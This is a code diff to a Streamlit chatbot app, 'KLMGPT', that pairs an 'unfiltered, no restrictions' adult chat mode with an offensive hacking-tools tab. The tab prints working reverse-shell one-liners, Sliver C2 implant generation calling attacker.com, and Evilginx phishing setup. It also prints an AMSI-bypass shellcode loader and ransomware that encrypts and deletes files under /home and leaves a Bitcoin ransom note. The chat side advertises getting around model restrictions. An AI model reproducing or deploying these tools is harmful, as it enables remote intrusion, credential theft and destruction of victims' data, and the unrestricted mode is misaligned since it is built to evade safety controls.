@@ -161,7 +161,7 @@ def get_gemini_response(prompt, image=None):
         err = str(e)
         if "429" in err or "quota" in err.lower():
             return "KLMGPT: Gemini API quota exceeded. Please try again later or use Groq instead."
-        return f"KLMGPT: {err}"
+        return f"KLMGPT: {str(e)}"
 
 # ─── Gemini Image Generation ──────────────────────────────────────────────
 def generate_gemini_image(prompt):
@@ -204,19 +204,33 @@ def generate_gemini_image(prompt):
         err = str(e)
         if "429" in err or "quota" in err.lower():
             return None, "Image generation quota exceeded. Free tier has limited requests."
-        return None, f"Image Generation Error: {err}"
+        return None, f"Image Generation Error: {str(e)}"
 
-# ─── Groq Response - UNFILTERED, NO RESTRICTIONS ─────────────────────────
+# ─── Groq Response - VALID MODEL (llama-3.3-70b-versatile) ──────────────
 def get_groq_response(prompt):
     try:
         sp = get_sp()
         msgs = [{"role":"system","content":sp},{"role":"user","content":prompt}]
         r = groq_client.chat.completions.create(
-            model="llama3-70b-8192", messages=msgs,  # Larger model for better responses
-            temperature=1.0, max_tokens=8192, top_p=0.95)
+            model="llama-3.3-70b-versatile",  # VALID model - not decommissioned
+            messages=msgs,
+            temperature=1.0, 
+            max_tokens=8192, 
+            top_p=0.95)
         return r.choices[0].message.content
     except Exception as e:
-        return f"KLMGPT: {str(e)}"
+        err = str(e)
+        # If llama-3.3 fails, try mixtral as fallback
+        try:
+            r = groq_client.chat.completions.create(
+                model="mixtral-8x7b-32768",
+                messages=msgs,
+                temperature=1.0,
+                max_tokens=8192,
+                top_p=0.95)
+            return r.choices[0].message.content
+        except:
+            return f"KLMGPT: {err}"
 
 # ─── Process File Upload ──────────────────────────────────────────────────
 def process_uploaded_file(uploaded_file):
@@ -292,17 +306,16 @@ def main_ui():
     with st.sidebar:
         st.markdown("## KLMGPT Controls")
         
-        # Show current active engine
         active_model = st.session_state.current_model
         if st.session_state.get('adult_mode'):
-            active_model = "Groq (Auto - Adult Mode)"
-        st.markdown(f"Active Engine: {active_model}")
+            active_model = "Groq (llama-3.3)"
+        st.markdown(f"Engine: {active_model}")
         
         st.markdown(f"User: {st.session_state.user_email}")
         
         if st.session_state.get('adult_mode'):
             st.markdown("<span class='adult-badge'>ADULT MODE ACTIVE</span>")
-            st.markdown("<span class='model-badge'>Using Groq (Unfiltered)</span>")
+            st.markdown("<span class='model-badge'>Groq - Unfiltered</span>")
         
         st.markdown("---")
         st.markdown("### File Upload")
@@ -335,7 +348,7 @@ def main_ui():
             with st.expander(f"Files ({len(st.session_state.uploaded_files_data)})"):
                 for i, f in enumerate(st.session_state.uploaded_files_data):
                     st.markdown(f"{i+1}. {f['name']}")
-                if st.button("Clear All Files"):
+                if st.button("Clear All"):
                     st.session_state.uploaded_files_data = []
                     st.rerun()
         
@@ -356,12 +369,12 @@ def main_ui():
         if st.session_state.get('adult_mode'):
             st.markdown("""
             <div style='background:#1a0a0a;border:1px solid #ff0066;border-radius:5px;padding:8px;margin:5px 0;text-align:center;color:#ff0066;font-weight:bold;'>
-            ADULT MODE ACTIVE - Using Groq (No restrictions)<br>
-            Type 'adult mode off' to disable | Kambi kathakal, sex chat, dirty talk available
+            ADULT MODE ACTIVE - Groq (llama-3.3) - No restrictions<br>
+            Type 'adult mode off' to disable | Kambi kathakal, sex chat, dirty talk
             </div>
             """, unsafe_allow_html=True)
         
-        with st.expander("Today's GK (auto-updates daily)", expanded=False):
+        with st.expander("Today's GK", expanded=False):
             st.markdown(f"<div class='gk-box'>{get_daily_gk().replace(chr(10),'<br>')}</div>", unsafe_allow_html=True)
         
         # Chat display
@@ -375,14 +388,14 @@ def main_ui():
             role_label = "YOU" if m['role']=='user' else "KLMGPT"
             st.markdown(f"<div class='chat-msg {msg_class}'><b>{role_label}:</b> {m['content']}</div>", unsafe_allow_html=True)
         
-        # Chat input - auto clears after send
+        # Chat input
         if 'input_key' not in st.session_state:
             st.session_state.input_key = 0
         
         user_input = st.text_input("", 
             placeholder="Ask anything... hack, code, chat, or type 'adult mode' for sexy chat", 
             label_visibility="collapsed", 
-            key=f"chat_input_{st.session_state.input_key}")
+            key=f"ci_{st.session_state.input_key}")
         
         col1, col2 = st.columns([4,1])
         with col1:
@@ -396,23 +409,23 @@ def main_ui():
             # Adult mode toggle from chat ONLY
             if user_input.lower().strip() == 'adult mode' or re.search(r'\bactivate\s*adult\b', user_input.lower()):
                 st.session_state.adult_mode = True
-                st.session_state.current_model = 'Groq'  # Auto switch to Groq
+                st.session_state.current_model = 'Groq'
             
             if re.search(r'\badult\s*mode\s*off\b', user_input.lower()) or re.search(r'\bdeactivate\s*adult\b', user_input.lower()):
                 st.session_state.adult_mode = False
-                st.session_state.current_model = 'Gemini'  # Switch back to Gemini
+                st.session_state.current_model = 'Gemini'
             
             st.session_state.chat_history.append({"role":"user","content":user_input})
             
-            # CRITICAL: In adult mode, ALWAYS use Groq (no restrictions)
-            # In normal mode, use Gemini
+            # Adult mode -> ALWAYS use Groq
             if st.session_state.get('adult_mode'):
-                with st.spinner("KLMGPT (Groq - Unfiltered) processing..."):
+                with st.spinner("KLMGPT (Groq - Unfiltered) thinking..."):
                     resp = get_groq_response(user_input)
             else:
+                # Normal mode -> Gemini
                 wants_image = any(w in user_input.lower() for w in ['generate image','create image','draw','make a picture','image of','picture of','ചിത്രം','ഇമേജ്'])
-                with st.spinner("KLMGPT processing..."):
-                    if wants_image and st.session_state.current_model == "Gemini":
+                with st.spinner("KLMGPT thinking..."):
+                    if wants_image:
                         img, text_resp = generate_gemini_image(user_input)
                         if img:
                             buf = io.BytesIO()
@@ -440,7 +453,7 @@ def main_ui():
         
         tool = st.selectbox("Select Tool", 
             ["Port Scanner","Reverse Shell","SQL Injection","XSS Generator",
-             "PHP Web Shell","Password Cracker (Hashcat)","Keylogger","Phishing Page (Evilginx)",
+             "PHP Web Shell","Password Cracker","Keylogger","Phishing Page (Evilginx)",
              "Brute Force","OSINT Recon","CVE Search","DoS Script","Shellcode Gen",
              "Packet Sniffer","Wi-Fi Cracker","Nuclei Scanner","Ligolo-ng Pivot",
              "Sliver C2","Rootkit Builder","Ransomware",
@@ -450,8 +463,7 @@ def main_ui():
         if tool == "Port Scanner":
             target = st.text_input("Target IP/Domain")
             if st.button("Generate Scanner"):
-                st.code(f"""# Advanced Port Scanner
-import socket, threading
+                st.code(f"""import socket, threading
 
 target = "{target or '127.0.0.1'}"
 open_ports = []
@@ -470,15 +482,13 @@ for p in range(1, 1025):
     t = threading.Thread(target=scan_port, args=(p,))
     t.start()
 
-print(f"Open ports: {{sorted(open_ports)}}")
-# nmap -sS -sV -p- -T4 {target}""")
+print(f"Open: {{sorted(open_ports)}}")""")
         
         elif tool == "Reverse Shell":
             ip = st.text_input("LHOST", "192.168.1.100")
             port = st.text_input("LPORT", "4444")
             if st.button("Generate Shells"):
-                st.code(f"""# PYTHON
-python3 -c '
+                st.code(f"""python3 -c '
 import socket,subprocess,os,pty
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("{ip}",{port}))
@@ -487,55 +497,38 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 pty.spawn("/bin/bash")'
 
-# BASH
 bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
-
-# PHP
 php -r '$s=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'
-
-# POWERSHELL
-powershell -NoP -NonI -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"
-
-# NETCAT
-nc -e /bin/sh {ip} {port}
-# OR: rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f""")
+nc -e /bin/sh {ip} {port}""")
         
         elif tool == "Nuclei Scanner":
             target_n = st.text_input("Target URL/IP")
             if st.button("Generate"):
-                st.code(f"""# go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
-
-nuclei -u {target_n or 'https://example.com'} -severity critical,high,medium
-nuclei -u {target_n or 'https://example.com'} -t ~/nuclei-templates/ -stats
-nuclei -u {target_n or 'https://example.com'} -tags cve,misconfig,exposure""")
+                st.code(f"""nuclei -u {target_n or 'https://example.com'} -severity critical,high,medium
+nuclei -u {target_n or 'https://example.com'} -tags cve,exposure""")
         
         elif tool == "Ligolo-ng Pivot":
             if st.button("Generate"):
-                st.code("""# Attacker:
-sudo ip tuntap add user $(whoami) mode tun ligolo
+                st.code("""sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 sudo ip route add 10.10.0.0/24 dev ligolo
 ./proxy -selfcert -laddr 0.0.0.0:443
-
-# Target:
-./agent -connect attacker.com:443 -ignore-cert""")
+# Target: ./agent -connect attacker.com:443 -ignore-cert""")
         
         elif tool == "Sliver C2":
             if st.button("Generate"):
                 st.code("""curl -sL https://sliver.sh/install | bash
 sliver
 generate --http http://attacker.com:80 --os windows --name win --save ./win.exe
-http --lhost 0.0.0.0 --lport 80
-use <id> -> shell -> getsystem""")
+http --lhost 0.0.0.0 --lport 80""")
         
         elif tool == "AV Bypass (AMSI)":
             if st.button("Generate"):
                 st.code("""import ctypes, base64
 
-shellcode_b64 = "YOUR_BASE64_SHELLCODE"
+shellcode_b64 = "YOUR_SHELLCODE"
 shellcode = base64.b64decode(shellcode_b64)
 
-# AMSI bypass
 ctypes.windll.kernel32.VirtualProtect.restype = ctypes.c_int
 amsi = ctypes.windll.kernel32.GetModuleHandleA(b'amsi.dll\\0')
 if amsi:
@@ -561,30 +554,23 @@ ctypes.windll.kernel32.WaitForSingleObject(-1, -1)""")
             if st.button("Generate"):
                 st.code("""from cryptography.fernet import Fernet
 import os
-
 key = Fernet.generate_key()
 cipher = Fernet(key)
-
 for root, dirs, files in os.walk('/home'):
     for f in files:
         path = os.path.join(root, f)
-        with open(path, 'rb') as file:
-            data = file.read()
+        with open(path, 'rb') as file: data = file.read()
         encrypted = cipher.encrypt(data)
-        with open(path + '.encrypted', 'wb') as file:
-            file.write(encrypted)
+        with open(path + '.encrypted', 'wb') as file: file.write(encrypted)
         os.remove(path)
-
 with open('/home/DECRYPT.txt', 'w') as f:
     f.write('Send 1 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa')""")
         
         elif tool == "Phishing Page (Evilginx)":
             if st.button("Generate"):
                 st.code("""git clone https://github.com/kgretzky/evilginx2.git && cd evilginx2 && make
-
 ./evilginx
 config domain login.yourdomain.com
-config ip 192.168.1.100
 phishlets hostname outlook outlook.yourdomain.com
 lures create outlook
 lures get-url 0""")
@@ -620,12 +606,12 @@ lures get-url 0""")
     
     # TAB 3: Image Gen
     with tab3:
-        st.markdown("## Image Generator (Gemini 3.1 Flash Image)")
-        img_prompt = st.text_area("Image description:", height=100, placeholder="Describe what image to generate...")
+        st.markdown("## Image Generator")
+        img_prompt = st.text_area("Description:", height=100)
         
         col_g1, col_g2 = st.columns([3,1])
         with col_g1:
-            gen_btn = st.button("GENERATE IMAGE", use_container_width=True)
+            gen_btn = st.button("GENERATE", use_container_width=True)
         with col_g2:
             if st.session_state.generated_images:
                 if st.button("CLEAR ALL", use_container_width=True):
@@ -644,17 +630,16 @@ lures get-url 0""")
             st.markdown("---")
             for i, gen_img in enumerate(st.session_state.generated_images[-10:]):
                 st.markdown(f"**{i+1}. Prompt:** {gen_img['prompt'][:80]}")
-                st.markdown(f"**Time:** {gen_img['time']}")
                 st.image(gen_img['data'], use_container_width=True)
                 st.markdown("---")
     
     # TAB 4: Camera
     with tab4:
         st.markdown("## Camera")
-        img = st.camera_input("Capture photo")
+        img = st.camera_input("Capture")
         if img:
             st.image(img)
-            if st.button("Analyze Image"):
+            if st.button("Analyze"):
                 image = Image.open(io.BytesIO(img.getvalue()))
                 r = get_gemini_response("Describe this image in detail.", image=image)
                 st.markdown(f"**Analysis:** {r}")
@@ -671,10 +656,10 @@ lures get-url 0""")
     
     # TAB 6: Files
     with tab6:
-        st.markdown("## File Manager")
+        st.markdown("## Files")
         if st.session_state.uploaded_files_data:
             for i, f in enumerate(st.session_state.uploaded_files_data):
-                with st.expander(f"{i+1}. {f['name']} ({f['content_type']})"):
+                with st.expander(f"{i+1}. {f['name']}"):
                     if f['content_type'] == 'image' and 'image' in f:
                         st.image(f['image'], use_container_width=True)
                     if 'text' in f:
@@ -682,7 +667,7 @@ lures get-url 0""")
         else:
             st.markdown("No files uploaded.")
 
-# ─── Login Page ────────────────────────────────────────────────────────────
+# ─── Login ────────────────────────────────────────────────────────────────
 def login_page():
     st.markdown("""
     <style>
@@ -709,7 +694,7 @@ def login_page():
         st.rerun()
     st.markdown("</div>", unsafe_allow_html=True)
 
-# ─── App Entry Point ───────────────────────────────────────────────────────
+# ─── Run ────────────────────────────────────────────────────────────────────
 init_state()
 if st.session_state.login_page and not st.session_state.authenticated:
     login_page()
